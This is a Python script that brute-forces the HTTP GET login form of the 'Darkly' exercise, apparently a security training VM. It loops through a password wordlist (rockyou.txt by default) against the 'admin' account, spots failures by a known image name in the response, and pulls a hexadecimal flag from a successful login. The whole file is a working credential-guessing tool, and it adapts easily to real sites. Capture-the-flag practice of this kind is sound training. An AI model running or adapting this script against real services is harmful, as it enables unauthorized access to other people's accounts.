#!/usr/bin/env python3
"""
Automates brute-forcing the HTTP GET login form from the Darkly exercise:
1. Reads a wordlist of passwords.
2. Sends GET requests to /index.php?page=signin with username and each password.
3. Detects failure by a known pattern in the response.
4. On success, prints the working credentials and extracts the flag.
"""

import argparse
import requests
import re
import sys

def brute_force_login(ip, username, wordlist, page, fail_pattern):
    """
    Try each password from the wordlist to authenticate the given username.
    Returns the successful password and the full response text.
    """
    url = f"http://{ip}/index.php"
    params = {
        'page': page,
        'username': username,
        'Login': 'Login'
    }

    with open(wordlist, 'r', errors='ignore') as f:
        for pwd in f:
            pwd = pwd.strip()
            if not pwd:
                continue
            params['password'] = pwd
            try:
                resp = requests.get(url, params=params, timeout=5)
            except requests.RequestException as e:
                print(f"[-] Request error with password '{pwd}': {e}")
                continue

            if fail_pattern not in resp.text:
                # Successful login
                return pwd, resp.text
            else:
                print(f"[-] Failed: '{pwd}'")

    return None, None

def extract_flag(html):
    """
    Extract a 64-character hexadecimal flag from the HTML response.
    """
    m = re.search(r'\b[0-9a-f]{64}\b', html)
    return m.group(0) if m else None

def main():
    parser = argparse.ArgumentParser(
        description="Brute-force the Darkly GET-form login and retrieve the flag."
    )
    parser.add_argument('ip', help="IP address of the Darkly VM")
    parser.add_argument('-u', '--username', default='admin',
                        help="Username to target (default: admin)")
    parser.add_argument('-w', '--wordlist', default='rockyou.txt',
                        help="Path to password wordlist (default: rockyou.txt)")
    parser.add_argument('-p', '--page', default='signin',
                        help="Value of 'page' parameter in URL (default: signin)")
    parser.add_argument('-f', '--fail-pattern', 
                        default='images/WrongAnswer.gif',
                        help="Pattern indicating login failure (default: images/WrongAnswer.gif)")
    args = parser.parse_args()

    print(f"[+] Starting brute-force against {args.ip} as '{args.username}'...")
    pwd, html = brute_force_login(
        args.ip, args.username, args.wordlist, args.page, args.fail_pattern
    )
    if pwd:
        print(f"[+] Success! Password: {pwd}")
        flag = extract_flag(html)
        if flag:
            print(f"[+] Retrieved flag: {flag}")
        else:
            print("[!] Login succeeded but no flag found in response.")
    else:
        print("[-] Brute-force failed: no password in wordlist worked.")

if __name__ == "__main__":
    main()


